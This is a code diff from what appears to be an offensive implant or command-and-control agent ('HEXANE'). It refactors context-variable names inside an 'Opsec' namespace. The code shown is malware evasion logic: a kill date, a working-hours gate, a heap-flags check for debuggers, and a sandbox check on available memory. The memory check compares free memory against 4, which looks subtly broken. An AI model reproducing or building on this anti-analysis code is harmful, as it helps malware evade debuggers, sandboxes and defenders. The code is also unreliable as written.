@@ -24,12 +24,12 @@ namespace Opsec {
     BOOL CheckTime() {
         HEXANE;
 
-        if (Ctx->config.kill_date != 0) {
-            if (GetTimeNow() >= Ctx->config.kill_date) {
+        if (ctx->config.kill_date != 0) {
+            if (GetTimeNow() >= ctx->config.kill_date) {
                 Shutdown(nullptr);
             }
         }
-        if (Ctx->config.hours) {
+        if (ctx->config.hours) {
             if (!InWorkingHours()) {
                 return false;
             }
@@ -47,9 +47,9 @@ namespace Opsec {
         PVOID heap_base             = { };
         ULONG flags_offset          = 0;
         ULONG force_flags_offset    = 0;
-        BOOL vista_or_greater       = Ctx->session.version >= WIN_VERSION_2008;
+        BOOL vista_or_greater       = ctx->session.version >= WIN_VERSION_2008;
 
-        Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
+        ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
 
 #if _WIN64
         heap_base = !m_x32 ? C_PTR(*RVA(ULONG_PTR*,peb, 0x18)) : C_PTR(*RVA(ULONG_PTR*,peb, 0x1030));
@@ -74,7 +74,7 @@ namespace Opsec {
         MEMORYSTATUSEX stats = { };
         stats.dwLength = sizeof(stats);
 
-        Ctx->win32.GlobalMemoryStatusEx(&stats);
+        ctx->enumapi.GlobalMemoryStatusEx(&stats);
         return stats.ullAvailPhys > 4;
     }
 
